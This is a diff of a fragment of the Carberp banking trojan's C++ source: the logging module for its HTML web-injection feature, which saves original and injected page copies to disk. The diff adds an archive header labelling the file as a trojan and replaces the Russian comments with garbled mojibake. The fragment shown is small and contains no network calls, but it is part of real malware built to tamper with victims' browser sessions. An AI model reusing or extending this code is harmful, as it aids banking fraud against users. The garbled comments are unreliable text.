@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #ifndef HTMLInjectLogH
 	#error Exclude module from project
@@ -34,8 +45,8 @@ THTMLInjectLog::~THTMLInjectLog()
 
 //---------------------------------------------------
 //  Close
-//  Функция закрывает лог Записывая оба варианта
-//  файла на диск
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 void THTMLInjectLog::Close(LPVOID NewDocument, DWORD NewDocumentSize)
 {
@@ -51,7 +62,7 @@ void THTMLInjectLog::Close(LPVOID NewDocument, DWORD NewDocumentSize)
 	if (Ext) *Ext = 0;
 	FDocument.CalcLength();
 
-	// Создаём директорию
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string WorkPath = Path + FDocument + FExt;
 	int Nomber = 1;
 	while (DirExists(WorkPath.t_str()))
@@ -67,7 +78,7 @@ void THTMLInjectLog::Close(LPVOID NewDocument, DWORD NewDocumentSize)
     }
 	CreateDirectoryA(WorkPath.t_str(), NULL);
 
-	// записываем
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string URLFile  = CombineFileName(WorkPath.t_str(), "URL.txt");
 	string Original = CombineFileName(WorkPath.t_str(), "Original.txt");
 	string Injected = CombineFileName(WorkPath.t_str(), "Injected.txt");
